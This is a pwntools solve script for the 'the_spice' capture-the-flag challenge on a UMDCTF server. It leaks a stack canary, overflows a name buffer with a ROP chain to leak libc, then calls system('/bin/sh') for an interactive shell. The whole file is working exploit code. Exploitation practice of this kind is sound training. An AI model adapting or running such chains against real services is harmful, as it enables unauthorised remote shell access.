from pwn import *

exe = ELF("./the_spice")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = remote("challs.umdctf.io", 31721)
# p = process("./the_spice")
# gdb.attach(p)

p.recvuntil(b">")
p.sendline(b"3")

p.recvuntil(b"index:")
p.sendline(b"9")

p.recvuntil(b"Buyer 9: ")
canary_start = u64(p.recvuntil(b",")[:-2].ljust(8,b"\x00"))
p.recvuntil(b"allocated ")
canary_end = int(p.recvuntil(b" ")[:-1])

canary = (canary_start << 32) | canary_end
log.success(f"{hex(canary)=}")

payload = b"A"*44
payload += p64(canary)
payload += b"B"*8
payload += p64(exe.plt["puts"])
payload += p64(exe.sym["main"])

p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"index:")
p.sendline(b"7")

p.recvuntil(b"name? ")
p.sendline(b"1000")

p.recvuntil(b"name: ")
p.sendline(payload)
p.recvuntil(b">")
p.sendline(b"5")
p.recvline()

libc_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc.address = libc_leak - 0x62050
log.success(f"{hex(libc.address)=}")

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]
pop_rdi = libc.address + 0x2a3e5
ret = 0x40101a

second_payload = b"A"*44
second_payload += p64(canary)
second_payload += b"B"*8
second_payload += p64(pop_rdi)
second_payload += p64(binsh)
second_payload += p64(ret)
second_payload += p64(libc_system)

p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"index:")
p.sendline(b"7")

p.recvuntil(b"name? ")
p.sendline(b"1000")

p.recvuntil(b"name: ")
p.sendline(second_payload)
p.recvuntil(b">")
p.sendline(b"5")

p.interactive()